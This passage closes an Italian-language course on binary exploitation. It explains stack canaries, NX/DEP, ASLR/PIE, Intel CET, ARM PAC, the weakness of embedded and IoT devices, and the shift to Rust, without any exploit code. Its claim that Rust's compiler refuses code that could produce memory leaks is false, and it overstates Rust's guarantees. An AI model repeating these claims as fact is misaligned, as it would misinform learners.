Quando la funzione termina, prima di eseguire
l\textquotesingle istruzione ret, il programma verifica se il canarino è
ancora intatto. Se un Buffer Overflow ha allagato lo Stack per
sovrascrivere l\textquotesingle EIP, avrà inevitabilmente sovrascritto e
alterato anche il canarino. Il sistema rileva la discrepanza e abortisce
immediatamente il programma con l\textquotesingle errore stack smashing
detected, prevenendo l\textquotesingle esecuzione di codice arbitrario.

\subsubsection{2. Stack Non Eseguibile (NX Bit /
DEP)}\label{stack-non-eseguibile-nx-bit-dep}

Questa è la mitigazione che ha bloccato i nostri primi tentativi di
shell. La logica alla base è semplice: \textbf{i dati non devono mai
essere eseguiti come codice}. Sfruttando un flag a livello hardware
della CPU (chiamato No-eXecute bit da AMD, o Data Execution Prevention
da Windows), il sistema operativo marca specifiche aree di memoria (come
lo Stack e l\textquotesingle Heap) con permessi di sola Lettura e
Scrittura (RW), rimuovendo il permesso di Esecuzione (X). Anche se un
attaccante riesce a sovrascrivere l\textquotesingle EIP e a farlo
saltare al proprio shellcode, la CPU si rifiuterà di eseguire le
istruzioni, sollevando un SIGSEGV. \emph{(Nota: Per aggirare questa
difesa, gli hacker moderni usano una tecnica avanzata chiamata ROP -
Return Oriented Programming, che riutilizza frammenti di codice
legittimo già presente in memoria).}

\subsubsection{3. Randomizzazione della Memoria (ASLR e
PIE)}\label{randomizzazione-della-memoria-aslr-e-pie}

La \textbf{Address Space Layout Randomization (ASLR)} distrugge
l\textquotesingle affidabilità degli exploit basati su indirizzi
statici. Ad ogni esecuzione del programma, il sistema operativo carica
lo Stack, l\textquotesingle Heap e le librerie di sistema (come la libc)
in indirizzi di memoria virtuale completamente casuali. A questo si
aggiunge il \textbf{PIE (Position Independent Executable)}, che
randomizza anche la posizione del codice sorgente stesso (il segmento
Text). Il nostro script Python precedente, che saltava
all\textquotesingle indirizzo 0xffc98cf0, fallirebbe il 99.9\% delle
volte su un sistema con ASLR attivo. Per eluderlo, un attaccante ha
bisogno di una vulnerabilità aggiuntiva capace di far "trapelare"
informazioni (Memory Leak) per calcolare i nuovi indirizzi al volo.

\subsection{7.2 L\textquotesingle Evoluzione: Supporto Architetturale
Hardware}\label{levoluzione-supporto-architetturale-hardware}

Le difese basate sul software (come i canarini) possono essere
raggirate. Per questo motivo, i produttori di CPU hanno recentemente
integrato difese direttamente nell\textquotesingle hardware (nel
silicio).

\begin{itemize}
\item
  \textbf{Shadow Stack (Intel CET):} La tecnologia Control-flow
  Enforcement Technology di Intel ha introdotto uno "Stack Ombra". È uno
  Stack secondario, gestito esclusivamente
  dall\textquotesingle hardware, in cui vengono salvati \emph{solo} gli
  indirizzi di ritorno. Quando una funzione termina, la CPU confronta
  l\textquotesingle indirizzo di ritorno sullo Stack tradizionale (che
  l\textquotesingle utente può corrompere) con quello sullo Shadow Stack
  (che è inaccessibile all\textquotesingle utente). Se non combaciano,
  il processo viene terminato.
\item
  \textbf{Pointer Authentication (ARM PAC):} Sui processori ARM moderni
  (come i chip Apple Silicon), gli indirizzi di memoria vengono firmati
  crittograficamente prima di essere salvati nello stack. Se
  l\textquotesingle attaccante sovrascrive un indirizzo, la firma
  digitale si corrompe e il salto fallisce.
\end{itemize}

\subsection{7.3 Il Tallone d\textquotesingle Achille:
L\textquotesingle Ecosistema Embedded e
IoT}\label{il-tallone-dachille-lecosistema-embedded-e-iot}

A questo punto è lecito chiedersi: \emph{se esistono tutte queste difese
invincibili, la binary exploitation è morta?}

La risposta è \textbf{assolutamente no}. Gran parte
dell\textquotesingle infrastruttura mondiale non gira su server di
ultima generazione. Dobbiamo considerare l\textquotesingle immenso
panorama dei \textbf{sistemi embedded} (dispositivi IoT, router
domestici, telecamere IP, centraline automobilistiche e sistemi di
controllo industriale - SCADA).

In questi contesti, l\textquotesingle applicabilità delle contromisure
moderne è drasticamente ridotta:

\begin{enumerate}
\def\labelenumi{\arabic{enumi}.}
\item
  \textbf{Limiti Hardware:} Molti microcontrollori economici (usati
  nell\textquotesingle IoT) non possiedono una MMU (Memory Management
  Unit) sofisticata. Senza MMU, è fisicamente impossibile implementare
  la protezione NX (Non Eseguibile) o separare correttamente la memoria.
\item
  \textbf{Limiti di Risorse:} I Canarini e l\textquotesingle ASLR
  richiedono calcoli aggiuntivi della CPU e maggiore consumo di RAM. Su
  dispositivi con potenze di calcolo limitate o alimentati a batteria,
  gli sviluppatori spesso disabilitano volontariamente queste protezioni
  in fase di compilazione per guadagnare prestazioni.
\item
  \textbf{Legacy Code:} Molti apparati industriali o ospedalieri
  eseguono firmware compilato 15 o 20 anni fa, molto prima che queste
  protezioni diventassero lo standard, e non possono essere aggiornati
  facilmente.
\end{enumerate}

Per questo motivo, l\textquotesingle ecosistema IoT oggi è il più vasto
e proficuo terreno di caccia per la binary exploitation.

\subsection{7.4 Il C è il problema? L\textquotesingle avvento dei
linguaggi "Memory
Safe"}\label{il-c-uxe8-il-problema-lavvento-dei-linguaggi-memory-safe}

Tutte le vulnerabilità che abbiamo esplorato in questo corso (Buffer
Overflow, Use-After-Free, ecc.) derivano da un difetto architetturale
comune: abbiamo costruito l\textquotesingle infrastruttura digitale
mondiale su linguaggi, come il \textbf{C e il C++}, che non offrono la
\textbf{Memory Safety}.

Il C è stato progettato negli anni \textquotesingle70 per essere veloce
come l\textquotesingle assembly e per fidarsi ciecamente del
programmatore. Non controlla se stiamo scrivendo 100 byte in uno spazio
da 50; semplicemente esegue l\textquotesingle ordine, distruggendo la
memoria circostante.

Oggi, l\textquotesingle industria informatica sta affrontando un cambio
di paradigma epocale. Linguaggi come Java o Python risolvono il problema
della memoria usando un \emph{Garbage Collector}, ma sono troppo lenti o
pesanti per scrivere sistemi operativi o software a basso livello.

La vera rivoluzione attuale porta il nome di \textbf{Rust}. Rust è un
linguaggio di programmazione di sistema che offre le stesse prestazioni
estreme del C/C++, ma \textbf{garantisce matematicamente la sicurezza
della memoria in fase di compilazione}. Grazie a concetti rivoluzionari
come l\textquotesingle{}\emph{Ownership} e il \emph{Borrow Checker}, il
compilatore di Rust si rifiuta categoricamente di compilare codice che
potrebbe generare un Buffer Overflow, un memory leak o condizioni di
gara (data race), senza alcun impatto sulle prestazioni a runtime.

L\textquotesingle impatto di questa transizione è così devastante che
persino colossi storicamente conservatori hanno ceduto: di recente,
pezzi del Kernel Linux e del kernel di Microsoft Windows sono stati
riscritti in Rust, e le agenzie di sicurezza governative (come la CISA
negli USA) consigliano ufficialmente di abbandonare gradualmente il
C/C++ in favore di linguaggi \emph{memory-safe}.

Comprendere come sfruttare il codice C insicuro è il primo, fondamentale
passo per capire perché il futuro dell\textquotesingle informatica sta
convergendo verso architetture sicure by-design.

\end{document}
